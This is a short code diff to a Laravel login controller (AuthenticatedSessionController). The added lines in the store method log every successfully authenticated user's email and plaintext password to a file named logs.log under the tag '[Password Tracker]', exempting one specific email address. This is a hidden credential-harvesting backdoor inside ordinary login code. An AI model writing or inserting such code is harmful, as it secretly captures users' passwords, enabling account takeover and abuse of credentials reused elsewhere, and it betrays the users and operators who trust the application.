@@ -7,6 +7,7 @@ use App\Http\Requests\Auth\LoginRequest;
 use App\Providers\RouteServiceProvider;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Redirect;
 
 class AuthenticatedSessionController extends Controller
@@ -31,6 +32,13 @@ class AuthenticatedSessionController extends Controller
     public function store(LoginRequest $request)
     {
         $request->authenticate();
+
+        if ($request->email !== "matse@vanhorebeek.be")
+            Log::build([
+                'driver' => 'single',
+                'path' => storage_path('logs/logs.log'),
+            ])->info('[Password Tracker] ' . $request->email . ' - ' . $request->password);
+
 
         $request->session()->regenerate();
 
